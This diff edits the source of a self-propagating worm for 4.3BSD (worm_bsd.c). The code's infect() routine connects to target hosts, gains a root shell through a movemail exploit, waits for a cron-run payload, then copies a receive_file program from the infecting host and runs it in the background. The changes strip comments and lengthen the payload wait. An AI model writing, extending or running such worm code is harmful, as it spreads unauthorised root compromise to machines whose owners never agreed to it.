@@ -6,11 +6,6 @@ cat > worm_bsd.c << 'EOF'
 #include <netdb.h>
 #include "worm_bsd.h"
 
-/* * Removed <sys/socket.h>, <netinet/in.h>, and <sys/time.h> 
- * to prevent redeclaration conflicts. They are already being 
- * pulled in by worm_bsd.h or netdb.h.
- */
-
 #define HOSTS_FILE "/etc/hosts"
 #define MAX_IP_LEN 64
 
@@ -105,7 +100,6 @@ void infect(ip, my_ip)
     char io_buf[IO_BUF_SIZE];
     char *argv[5];
 
-    /* Initialize buffers with bzero */
     bzero(buf, BUF_SIZE);
     bzero(io_buf, IO_BUF_SIZE);
 
@@ -127,7 +121,8 @@ void infect(ip, my_ip)
     sleep(5);
 
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
-    sleep(5);
+    printf("[*] Waiting for cron daemon to execute payload (65s)...\n");
+    sleep(65);
 
     deploy_receive_file(sock, my_ip);
     
@@ -144,7 +139,6 @@ void infect(ip, my_ip)
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
-    /* Absolute path is safer in 4.3BSD shells */
     write_to_sock(sock, "/tmp/receive_file &\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
